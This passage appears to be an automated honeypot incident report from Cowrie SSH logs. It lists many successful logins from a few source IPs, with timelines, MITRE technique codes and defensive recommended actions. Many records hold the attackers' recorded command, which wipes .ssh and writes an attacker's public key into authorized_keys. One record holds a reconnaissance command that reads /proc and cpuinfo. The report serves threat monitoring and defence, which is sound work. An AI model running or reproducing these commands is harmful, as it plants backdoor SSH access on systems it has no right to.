| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:31:44` | `cowrie.session.connect` |
| `2026-05-06 16:31:44` | `cowrie.client.version` |
| `2026-05-06 16:31:44` | `cowrie.client.kex` |
| `2026-05-06 16:31:45` | `cowrie.login.success` |
| `2026-05-06 16:31:46` | `cowrie.session.params` |
| `2026-05-06 16:31:46` | `cowrie.command.input` |
| `2026-05-06 16:31:46` | `cowrie.command.failed` |
| `2026-05-06 16:31:46` | `cowrie.log.closed` |
| `2026-05-06 16:31:46` | `cowrie.session.params` |
| `2026-05-06 16:31:46` | `cowrie.command.input` |
| `2026-05-06 16:31:46` | `cowrie.session.file_download` |
| `2026-05-06 16:31:46` | `cowrie.log.closed` |
| `2026-05-06 16:31:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d892e49a1378

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:31 |
| **Last Seen** | 2026-05-06 16:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:31:49` | `cowrie.session.connect` |
| `2026-05-06 16:31:49` | `cowrie.client.version` |
| `2026-05-06 16:31:49` | `cowrie.client.kex` |
| `2026-05-06 16:31:50` | `cowrie.login.success` |
| `2026-05-06 16:31:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-226dba25dae2

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:32 |
| **Last Seen** | 2026-05-06 16:32 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:32:31` | `cowrie.session.connect` |
| `2026-05-06 16:32:31` | `cowrie.client.version` |
| `2026-05-06 16:32:31` | `cowrie.client.kex` |
| `2026-05-06 16:32:32` | `cowrie.login.success` |
| `2026-05-06 16:32:32` | `cowrie.session.params` |
| `2026-05-06 16:32:32` | `cowrie.command.input` |
| `2026-05-06 16:32:32` | `cowrie.command.failed` |
| `2026-05-06 16:32:33` | `cowrie.log.closed` |
| `2026-05-06 16:32:33` | `cowrie.session.params` |
| `2026-05-06 16:32:33` | `cowrie.command.input` |
| `2026-05-06 16:32:33` | `cowrie.session.file_download` |
| `2026-05-06 16:32:33` | `cowrie.log.closed` |
| `2026-05-06 16:32:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7ed2b350bcc

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:32 |
| **Last Seen** | 2026-05-06 16:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:32:36` | `cowrie.session.connect` |
| `2026-05-06 16:32:36` | `cowrie.client.version` |
| `2026-05-06 16:32:36` | `cowrie.client.kex` |
| `2026-05-06 16:32:37` | `cowrie.login.success` |
| `2026-05-06 16:32:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-536ec6e5f697

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:33 |
| **Last Seen** | 2026-05-06 16:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:33:18` | `cowrie.session.connect` |
| `2026-05-06 16:33:18` | `cowrie.client.version` |
| `2026-05-06 16:33:18` | `cowrie.client.kex` |
| `2026-05-06 16:33:19` | `cowrie.login.success` |
| `2026-05-06 16:33:19` | `cowrie.session.params` |
| `2026-05-06 16:33:19` | `cowrie.command.input` |
| `2026-05-06 16:33:19` | `cowrie.command.failed` |
| `2026-05-06 16:33:19` | `cowrie.log.closed` |
| `2026-05-06 16:33:20` | `cowrie.session.params` |
| `2026-05-06 16:33:20` | `cowrie.command.input` |
| `2026-05-06 16:33:20` | `cowrie.session.file_download` |
| `2026-05-06 16:33:20` | `cowrie.log.closed` |
| `2026-05-06 16:33:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64a53a646ce0

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:33 |
| **Last Seen** | 2026-05-06 16:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:33:22` | `cowrie.session.connect` |
| `2026-05-06 16:33:22` | `cowrie.client.version` |
| `2026-05-06 16:33:23` | `cowrie.client.kex` |
| `2026-05-06 16:33:23` | `cowrie.login.success` |
| `2026-05-06 16:33:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6e32e21d249

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:34 |
| **Last Seen** | 2026-05-06 16:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:34:05` | `cowrie.session.connect` |
| `2026-05-06 16:34:05` | `cowrie.client.version` |
| `2026-05-06 16:34:06` | `cowrie.client.kex` |
| `2026-05-06 16:34:06` | `cowrie.login.success` |
| `2026-05-06 16:34:07` | `cowrie.session.params` |
| `2026-05-06 16:34:07` | `cowrie.command.input` |
| `2026-05-06 16:34:07` | `cowrie.command.failed` |
| `2026-05-06 16:34:07` | `cowrie.log.closed` |
| `2026-05-06 16:34:07` | `cowrie.session.params` |
| `2026-05-06 16:34:07` | `cowrie.command.input` |
| `2026-05-06 16:34:08` | `cowrie.session.file_download` |
| `2026-05-06 16:34:08` | `cowrie.log.closed` |
| `2026-05-06 16:34:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5afb8371c777

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:34 |
| **Last Seen** | 2026-05-06 16:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:34:10` | `cowrie.session.connect` |
| `2026-05-06 16:34:10` | `cowrie.client.version` |
| `2026-05-06 16:34:11` | `cowrie.client.kex` |
| `2026-05-06 16:34:12` | `cowrie.login.success` |
| `2026-05-06 16:34:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a447147d9071

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:34 |
| **Last Seen** | 2026-05-06 16:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:34:59` | `cowrie.session.connect` |
| `2026-05-06 16:34:59` | `cowrie.client.version` |
| `2026-05-06 16:34:59` | `cowrie.client.kex` |
| `2026-05-06 16:35:00` | `cowrie.login.success` |
| `2026-05-06 16:35:00` | `cowrie.session.params` |
| `2026-05-06 16:35:00` | `cowrie.command.input` |
| `2026-05-06 16:35:00` | `cowrie.command.failed` |
| `2026-05-06 16:35:00` | `cowrie.log.closed` |
| `2026-05-06 16:35:01` | `cowrie.session.params` |
| `2026-05-06 16:35:01` | `cowrie.command.input` |
| `2026-05-06 16:35:01` | `cowrie.session.file_download` |
| `2026-05-06 16:35:01` | `cowrie.log.closed` |
| `2026-05-06 16:35:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca6120080d79

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:35 |
| **Last Seen** | 2026-05-06 16:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:35:04` | `cowrie.session.connect` |
| `2026-05-06 16:35:04` | `cowrie.client.version` |
| `2026-05-06 16:35:04` | `cowrie.client.kex` |
| `2026-05-06 16:35:05` | `cowrie.login.success` |
| `2026-05-06 16:35:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7524a1276954

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:35 |
| **Last Seen** | 2026-05-06 16:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:35:48` | `cowrie.session.connect` |
| `2026-05-06 16:35:48` | `cowrie.client.version` |
| `2026-05-06 16:35:48` | `cowrie.client.kex` |
| `2026-05-06 16:35:49` | `cowrie.login.success` |
| `2026-05-06 16:35:50` | `cowrie.session.params` |
| `2026-05-06 16:35:50` | `cowrie.command.input` |
| `2026-05-06 16:35:50` | `cowrie.command.failed` |
| `2026-05-06 16:35:50` | `cowrie.log.closed` |
| `2026-05-06 16:35:50` | `cowrie.session.params` |
| `2026-05-06 16:35:50` | `cowrie.command.input` |
| `2026-05-06 16:35:50` | `cowrie.session.file_download` |
| `2026-05-06 16:35:50` | `cowrie.log.closed` |
| `2026-05-06 16:35:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0de8f3915061

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:35 |
| **Last Seen** | 2026-05-06 16:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:35:53` | `cowrie.session.connect` |
| `2026-05-06 16:35:53` | `cowrie.client.version` |
| `2026-05-06 16:35:54` | `cowrie.client.kex` |
| `2026-05-06 16:35:55` | `cowrie.login.success` |
| `2026-05-06 16:35:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eccd60b7d148

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:36 |
| **Last Seen** | 2026-05-06 16:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:36:36` | `cowrie.session.connect` |
| `2026-05-06 16:36:36` | `cowrie.client.version` |
| `2026-05-06 16:36:36` | `cowrie.client.kex` |
| `2026-05-06 16:36:37` | `cowrie.login.success` |
| `2026-05-06 16:36:38` | `cowrie.session.params` |
| `2026-05-06 16:36:38` | `cowrie.command.input` |
| `2026-05-06 16:36:38` | `cowrie.command.failed` |
| `2026-05-06 16:36:38` | `cowrie.log.closed` |
| `2026-05-06 16:36:38` | `cowrie.session.params` |
| `2026-05-06 16:36:38` | `cowrie.command.input` |
| `2026-05-06 16:36:38` | `cowrie.session.file_download` |
| `2026-05-06 16:36:38` | `cowrie.log.closed` |
| `2026-05-06 16:36:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e20badd1a12b

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:36 |
| **Last Seen** | 2026-05-06 16:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:36:41` | `cowrie.session.connect` |
| `2026-05-06 16:36:41` | `cowrie.client.version` |
| `2026-05-06 16:36:41` | `cowrie.client.kex` |
| `2026-05-06 16:36:42` | `cowrie.login.success` |
| `2026-05-06 16:36:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d22bc7fcf166

| Field | Detail |
|---|---|
| **Source IP** | `192.42.116[.]100` |
| **First Seen** | 2026-05-06 16:38 |
| **Last Seen** | 2026-05-06 16:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo "bash --help; ls /proc/1/; cat /proc/1/mounts; cat /proc/cpuinfo; echo __1778085483657986237" | sh, bash --help; ls /proc/1/; cat /proc/1/mounts; cat /proc/cpuinfo; echo __1778085483657986237
` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:38:00` | `cowrie.session.connect` |
| `2026-05-06 16:38:01` | `cowrie.client.version` |
| `2026-05-06 16:38:01` | `cowrie.client.kex` |
| `2026-05-06 16:38:02` | `cowrie.login.success` |
| `2026-05-06 16:38:02` | `cowrie.client.size` |
| `2026-05-06 16:38:03` | `cowrie.session.params` |
| `2026-05-06 16:38:03` | `cowrie.command.input` |
| `2026-05-06 16:38:03` | `cowrie.command.input` |
| `2026-05-06 16:38:03` | `cowrie.command.input` |
| `2026-05-06 16:38:08` | `cowrie.log.closed` |
| `2026-05-06 16:38:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.42.116[.]100` to AbuseIPDB if not already reported
- [ ] Block `192.42.116[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ad637c3c75b

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:38 |
| **Last Seen** | 2026-05-06 16:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:38:10` | `cowrie.session.connect` |
| `2026-05-06 16:38:10` | `cowrie.client.version` |
| `2026-05-06 16:38:10` | `cowrie.client.kex` |
| `2026-05-06 16:38:11` | `cowrie.login.success` |
| `2026-05-06 16:38:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2aaab49fcec2

| Field | Detail |
|---|---|
| **Source IP** | `172.173.117[.]246` |
| **First Seen** | 2026-05-06 16:44 |
| **Last Seen** | 2026-05-06 16:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:44:23` | `cowrie.session.connect` |
| `2026-05-06 16:44:23` | `cowrie.client.version` |
| `2026-05-06 16:44:23` | `cowrie.client.kex` |
| `2026-05-06 16:44:24` | `cowrie.login.success` |
| `2026-05-06 16:44:24` | `cowrie.session.params` |
| `2026-05-06 16:44:24` | `cowrie.command.input` |
| `2026-05-06 16:44:24` | `cowrie.command.failed` |
| `2026-05-06 16:44:24` | `cowrie.log.closed` |
| `2026-05-06 16:44:25` | `cowrie.session.params` |
| `2026-05-06 16:44:25` | `cowrie.command.input` |
| `2026-05-06 16:44:25` | `cowrie.session.file_download` |
| `2026-05-06 16:44:25` | `cowrie.log.closed` |
| `2026-05-06 16:44:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.117[.]246` to AbuseIPDB if not already reported
- [ ] Block `172.173.117[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa7cb1f58e9e

| Field | Detail |
|---|---|
| **Source IP** | `172.173.117[.]246` |
| **First Seen** | 2026-05-06 16:44 |
| **Last Seen** | 2026-05-06 16:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
